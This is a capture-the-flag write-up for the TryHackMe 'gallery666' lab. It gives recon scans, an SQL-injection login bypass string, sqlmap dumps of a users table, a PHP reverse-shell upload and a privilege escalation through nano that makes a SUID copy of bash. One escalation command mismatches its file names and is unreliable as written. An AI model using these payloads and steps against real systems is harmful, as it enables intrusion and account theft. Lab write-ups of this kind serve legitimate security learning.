gallery666
===
###### tags: `THM` `Easy`
###### Link: https://tryhackme.com/room/gallery666

# Recon

## Nmap
### Opened ports
```bash
$ nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $ip -oG allPorts.txt
```
```
PORT     STATE SERVICE    REASON
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```

### OS
TTL 63 --> It seems a **Linux** target

### Detect services
```bash
$ nmap -sCV -p xx,yy $ip -oN targeted
```
```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Simple Image Gallery System
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
```

CMS: **Simple Image Gallery System**
Server: **Apache/2.4.29**

### Well-known vulnerabilities
```bash
$ nmap -Pn -sV -v --script vuln -p xx,yy $ip
```
```
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners:
|   cpe:/a:apache:http_server:2.4.29:
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
...

8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| vulners:
|   cpe:/a:apache:http_server:2.4.29:
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
...

| http-phpmyadmin-dir-traversal:
|   VULNERABLE:
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
|     State: UNKNOWN (unable to test)
|     IDs:  CVE:CVE-2005-3299
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
|
|     Disclosure date: 2005-10-nil
|     Extra information:
|       ../../../../../etc/passwd :
|
(blank, no passwd)
```

## Dirsearch | Gobuster

```bash
$ dirsearch -u http://$ip
```
```
[05:02:16] Starting:
[05:02:19] 403 -  277B  - /.htaccess.bak1
[05:02:19] 403 -  277B  - /.ht_wsr.txt
[05:02:19] 403 -  277B  - /.htaccess.orig
[05:02:19] 403 -  277B  - /.htaccess.sample
[05:02:19] 403 -  277B  - /.htaccess.save
[05:02:19] 403 -  277B  - /.htaccess_sc
[05:02:19] 403 -  277B  - /.htaccessBAK
[05:02:19] 403 -  277B  - /.htaccess_extra
[05:02:19] 403 -  277B  - /.htaccess_orig
[05:02:19] 403 -  277B  - /.htaccessOLD2
[05:02:19] 403 -  277B  - /.htaccessOLD
[05:02:19] 403 -  277B  - /.htm
[05:02:19] 403 -  277B  - /.html
[05:02:19] 403 -  277B  - /.httr-oauth
[05:02:19] 403 -  277B  - /.htpasswd_test
[05:02:19] 403 -  277B  - /.htpasswds
[05:02:21] 403 -  277B  - /.php
[05:02:49] 301 -  314B  - /gallery  ->  http://10.10.139.75/gallery/
[05:02:51] 200 -   11KB - /index.html
[05:03:07] 403 -  277B  - /server-status
[05:03:07] 403 -  277B  - /server-status/     
```

```bash
$ dirsearch -u http://$ip/gallery/
```
```
[05:13:30] Starting:
[05:13:34] 403 -  277B  - /gallery/.ht_wsr.txt                             
[05:13:34] 403 -  277B  - /gallery/.htaccess.bak1                          
[05:13:34] 403 -  277B  - /gallery/.htaccess.sample
[05:13:34] 403 -  277B  - /gallery/.htaccess.orig
[05:13:35] 403 -  277B  - /gallery/.htaccess.save
[05:13:35] 403 -  277B  - /gallery/.htaccess_orig
[05:13:35] 403 -  277B  - /gallery/.htaccess_extra
[05:13:35] 403 -  277B  - /gallery/.htaccessBAK
[05:13:35] 403 -  277B  - /gallery/.htaccess_sc
[05:13:35] 403 -  277B  - /gallery/.htaccessOLD
[05:13:35] 403 -  277B  - /gallery/.htaccessOLD2
[05:13:35] 403 -  277B  - /gallery/.htm                                    
[05:13:35] 403 -  277B  - /gallery/.html
[05:13:35] 403 -  277B  - /gallery/.htpasswds
[05:13:35] 403 -  277B  - /gallery/.htpasswd_test
[05:13:35] 403 -  277B  - /gallery/.httr-oauth
[05:13:36] 403 -  277B  - /gallery/.php                                    
[05:13:38] 200 -  198B  - /gallery/404.html                                 
[05:13:53] 301 -  321B  - /gallery/albums  ->  http://10.10.139.75/gallery/albums/
[05:13:54] 301 -  323B  - /gallery/archives  ->  http://10.10.139.75/gallery/archives/
[05:13:54] 200 -    1KB - /gallery/assets/                                  
[05:13:54] 301 -  321B  - /gallery/assets  ->  http://10.10.139.75/gallery/assets/
[05:13:56] 301 -  320B  - /gallery/build  ->  http://10.10.139.75/gallery/build/
[05:13:56] 200 -    1KB - /gallery/build/                                   
[05:13:57] 200 -    2KB - /gallery/classes/                                 
[05:13:58] 301 -  322B  - /gallery/classes  ->  http://10.10.139.75/gallery/classes/
[05:13:58] 200 -    0B  - /gallery/config.php                               
[05:14:00] 200 -    8B  - /gallery/create_account.php                       
[05:14:00] 301 -  323B  - /gallery/database  ->  http://10.10.139.75/gallery/database/
[05:14:00] 200 -  769B  - /gallery/database/                                
[05:14:01] 200 -    1KB - /gallery/dist/                                    
[05:14:01] 301 -  319B  - /gallery/dist  ->  http://10.10.139.75/gallery/dist/
[05:14:06] 500 -    0B  - /gallery/home.php                                 
[05:14:07] 301 -  318B  - /gallery/inc  ->  http://10.10.139.75/gallery/inc/
[05:14:07] 200 -    2KB - /gallery/inc/                                     
[05:14:08] 200 -   17KB - /gallery/index.php                                
[05:14:09] 200 -   17KB - /gallery/index.php/login/                         
[05:14:11] 200 -    8KB - /gallery/login.php                                
[05:14:20] 301 -  322B  - /gallery/plugins  ->  http://10.10.139.75/gallery/plugins/
[05:14:21] 200 -   13KB - /gallery/plugins/                                 
[05:14:23] 301 -  321B  - /gallery/report  ->  http://10.10.139.75/gallery/report/
[05:14:32] 301 -  322B  - /gallery/uploads  ->  http://10.10.139.75/gallery/uploads/
[05:14:32] 200 -    2KB - /gallery/uploads/                                 
[05:14:32] 301 -  319B  - /gallery/user  ->  http://10.10.139.75/gallery/user/
[05:14:33] 500 -    0B  - /gallery/user/
```

### Interesting paths
http://10.10.139.75/gallery/classes/

![97bb36ac29aa944efa61ac5d8fcea09a.png](/writeups/main/gallery666/_resources/97bb36ac29aa944efa61ac5d8fcea09a.png)

http://10.10.139.75/gallery/uploads/

![712c4fe6b40661551d0fdc93884d636f.png](/writeups/main/gallery666/_resources/712c4fe6b40661551d0fdc93884d636f.png)

http://10.10.139.75/gallery/create_account.php

![fcd69eb8a49647b0c1ea164baa2ad7b3.png](/writeups/main/gallery666/_resources/fcd69eb8a49647b0c1ea164baa2ad7b3.png)

http://10.10.139.75/gallery/report/

![9c0870528dcb602900510f10751af6d1.png](/writeups/main/gallery666/_resources/9c0870528dcb602900510f10751af6d1.png)

# Explotation

## Web Autentication
Based on https://www.exploit-db.com/exploits/50214 exploit for Simple Image Gallery 1.0, I manually bypass the autentication:
- **user**: admin' or '1'='1'#
- **pwd**: n/a

## SQLi
After that, I use the following explotation https://www.exploit-db.com/exploits/50198 and I run sqlmap to extract info from the DB:

![14a581790e843bb0b1c5722395f5c4f3.png](/writeups/main/gallery666/_resources/14a581790e843bb0b1c5722395f5c4f3.png)

![7b89e4d2042b906ee4a3436f7a6c89a6.png](/writeups/main/gallery666/_resources/7b89e4d2042b906ee4a3436f7a6c89a6.png)

```bash
sqlmap -r Documents/gallery666/test.req --dbs
```
```
...
[07:39:14] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
...
[07:39:15] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
...
[INFO] the back-end DBMS is MySQL
...
[07:39:20] [INFO] fetching database names
available databases [2]:
[*] gallery_db
[*] information_schema
```

```bash
sqlmap -r Documents/gallery666/test.req --tables -D gallery_db
```
```
Database: gallery_db
[4 tables]
+-------------+
| album_list  |
| images      |
| system_info |
| users       |
+-------------+
```

```bash
sqlmap -r Documents/gallery666/test.req --columns -T users
```
```
Database: gallery_db
Table: users
[10 columns]
+--------------+--------------+
| Column       | Type         |
+--------------+--------------+
| avatar       | text         |
| date_added   | datetime     |
| date_updated | datetime     |
| firstname    | varchar(250) |
| id           | int(50)      |
| last_login   | datetime     |
| lastname     | varchar(250) |
| password     | text         |
| type         | tinyint(1)   |
| username     | text         |
+--------------+--------------+
```

```bash
sqlmap -r Documents/gallery666/test.req --columns -T users --dump
```


![e215fb195b6da5104468129680490b61.png](/writeups/main/gallery666/_resources/e215fb195b6da5104468129680490b61.png)

**Admin hash**: a228b12a08b6527e7978cbe5d914531c
*Note: it doesn't seem that can be cracked.*

## Spawn a shell
I see that I can upload files:

![0911f4a9f71307264f5a877c393a9df2.png](/writeups/main/gallery666/_resources/0911f4a9f71307264f5a877c393a9df2.png)

And I know where the files are saved:

![f8f666bbf88c76534594edeb7f5c238c.png](/writeups/main/gallery666/_resources/f8f666bbf88c76534594edeb7f5c238c.png)

http://10.10.24.152/gallery/uploads/user_1/filename

So, I tried to upload a php file:

![425a7cb185736eec8eae64a813ceb3a8.png](/writeups/main/gallery666/_resources/425a7cb185736eec8eae64a813ceb3a8.png)

Finally, I upload a [php reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)  and I gain a shell:

![ded4a5ee43357f3e2decad24509f0cff.png](/writeups/main/gallery666/_resources/ded4a5ee43357f3e2decad24509f0cff.png)

![967b75aceac72371a6dea40889faf366.png](/writeups/main/gallery666/_resources/967b75aceac72371a6dea40889faf366.png)

# Post-explotation
We are **www-data**.

- **Users** with home:
	- mike
	- ubuntu
	- root

## Linpeas
Sudo version 1.8.21p2
Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

### SUID

```bash
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
```
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 43088 Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root root 26696 Sep 16  2020 /bin/umount
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44664 Jan 25 16:26 /bin/su
-rwxr-sr-x 1 root shadow 34816 Apr  8  2021 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34816 Apr  8  2021 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 149080 Jan 19  2021 /usr/bin/sudo
-rwxr-sr-x 1 root ssh 362640 Aug 11  2021 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 30800 Sep 16  2020 /usr/bin/wall
-rwxr-sr-x 1 root shadow 71816 Jan 25 16:26 /usr/bin/chage
-rwsr-xr-x 1 root root 59640 Jan 25 16:26 /usr/bin/passwd
-rwsr-xr-x 1 root root 44528 Jan 25 16:26 /usr/bin/chsh
-rwsr-xr-x 1 root root 40344 Jan 25 16:26 /usr/bin/newgrp
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 76496 Jan 25 16:26 /usr/bin/chfn
-rwxr-sr-x 1 root tty 14328 Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 39352 Nov 16  2017 /usr/bin/crontab
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwxr-sr-x 1 root shadow 22808 Jan 25 16:26 /usr/bin/expiry
-rwxr-sr-x 1 root mail 18424 Dec  3  2017 /usr/bin/dotlockfile
-rwxr-sr-x 1 root mlocate 43088 Mar  1  2018 /usr/bin/mlocate
-rwsr-xr-x 1 root root 75824 Jan 25 16:26 /usr/bin/gpasswd
-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-xr-x 1 root root 436552 Aug 11  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14328 Jan 12 12:34 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-r-xr-sr-x 1 root postdrop 14456 Aug 12  2021 /usr/sbin/postdrop
-r-xr-sr-x 1 root postdrop 22600 Aug 12  2021 /usr/sbin/postqueue
```

### Path enumeration
Interesting path: /var/backups/mike_home_backup/

![4758415e5a4ab4d61bb6815259992f51.png](/writeups/main/gallery666/_resources/4758415e5a4ab4d61bb6815259992f51.png)

![4ba8abce75882db0deb4c306bd420c42.png](/writeups/main/gallery666/_resources/4ba8abce75882db0deb4c306bd420c42.png)

## User flag
Inside of it, we have some files from mike home:

![113e03c594ae706342ba1af09cf8d265.png](/writeups/main/gallery666/_resources/113e03c594ae706342ba1af09cf8d265.png)

**.bash_history** usually has important information:

![788bd5651a12caa987d7e45c0e77d451.png](/writeups/main/gallery666/_resources/788bd5651a12caa987d7e45c0e77d451.png)

Yeah, it seems there is the mike password. After `su mike`and that password, we are logged as Mike:

![4d7322fb3427abe902bb08a70bb54ba3.png](/writeups/main/gallery666/_resources/4d7322fb3427abe902bb08a70bb54ba3.png)

The user flag:

![020dc451d590d26273a2479f424e4098.png](/writeups/main/gallery666/_resources/020dc451d590d26273a2479f424e4098.png)

## Privilege escalation - root flag
```bash
$ sudo -l
```

![04310c6ab8260f77c228b82b51f327ce.png](/writeups/main/gallery666/_resources/04310c6ab8260f77c228b82b51f327ce.png)

We can execute this command as root: `/bin/bash /opt/rootkit.sh`

What is this script?
```bash
mike@gallery:~$ ls -lash /opt/rootkit.sh
```
```
4.0K -rw-r--r-- 1 root root 364 May 20  2021 /opt/rootkit.sh
```
```bash
mike@gallery:~$ cat /opt/rootkit.sh
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

We can use **/bin/nano** to execute commands as root. We have to choose the "read" option:
```bash
mike@gallery:/opt$ sudo /bin/bash /opt/rootkit.sh
```
```
Would you like to versioncheck, update, list or read the report ? read
Error opening terminal: unknown.
```

But it returns an error from nano. That problem is resolved in https://bobcares.com/blog/docker-error-opening-terminal-unknown/

Then, inside the text editor, I type **CTRL+R** in order to open a file, then **CTRL+X** to execute a command, and I do the following:
```bash
cp /bin/bash /tmp/custom_bash; chmod 777 /tmp/bash; chmod u+s /tmp/bash;
```

I exit from nano and I execute the copy of bash - [GTFOBins ref](https://gtfobins.github.io/gtfobins/bash/#suid):
```bash
./custom_bash -p
```

![e909f82c9f4cc91861f150d869ec0a58.png](/writeups/main/gallery666/_resources/e909f82c9f4cc91861f150d869ec0a58.png)

The **root** flag:

![1d64a4fbd84e64582f2fdccb0832baf9.png](/writeups/main/gallery666/_resources/1d64a4fbd84e64582f2fdccb0832baf9.png)
